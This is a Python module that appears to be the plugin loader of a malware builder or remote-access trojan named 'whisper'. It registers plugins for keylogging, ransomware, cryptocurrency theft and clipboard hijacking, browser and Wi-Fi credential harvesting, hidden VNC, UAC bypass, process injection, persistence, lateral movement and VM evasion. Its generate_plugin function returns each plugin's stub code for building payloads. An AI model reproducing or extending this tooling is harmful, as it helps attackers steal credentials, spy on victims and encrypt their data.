import os, importlib, pkgutil, sys, logging

from plugin_base import validate_plugin_module

log = logging.getLogger("whisper.plugins")
PLUGIN_REGISTRY: dict[str, object] = {}

_PLUGIN_NAMES = [
    "anti_vm", "browser_harvest", "clipboard", "crypto_clipper", "crypto_steal",
    "dns_hijack", "file_hunter", "file_manager", "hvnc", "keylogger",
    "lateral", "persistence", "process_inject", "ransomware", "screenshot",
    "shell", "uac_bypass", "vuln_scan", "webcam", "wifi_harvest",
]

def _load() -> dict[str, object]:
    if getattr(sys, 'frozen', False):
        names = _PLUGIN_NAMES
    else:
        pkg_dir = os.path.dirname(__file__)
        names = []
        for _, modname, _ in pkgutil.iter_modules([pkg_dir]):
            if not modname.startswith("_"):
                names.append(modname)
    for modname in names:
        try:
            mod = importlib.import_module(f".{modname}", __package__)
            validate_plugin_module(mod, modname)
            PLUGIN_REGISTRY[modname] = mod
            log.debug("Loaded plugin: %s", modname)
        except Exception as e:
            log.warning("Failed to load plugin '%s': %s", modname, e)
    return PLUGIN_REGISTRY

PLUGIN_REGISTRY = _load()

def get_info() -> dict:
    return {n: {"name": m.PLUGIN["name"], "desc": m.PLUGIN["desc"], "deps": m.PLUGIN.get("deps", []), "size": m.PLUGIN.get("size", 0)} for n, m in PLUGIN_REGISTRY.items()}

def generate_plugin(modname: str) -> tuple[str, dict]:
    mod = PLUGIN_REGISTRY.get(modname)
    if not mod: return "", {}
    code = getattr(mod, "STUB_CODE", "")
    cmds = mod.get_commands() if hasattr(mod, "get_commands") else {}
    return code, cmds
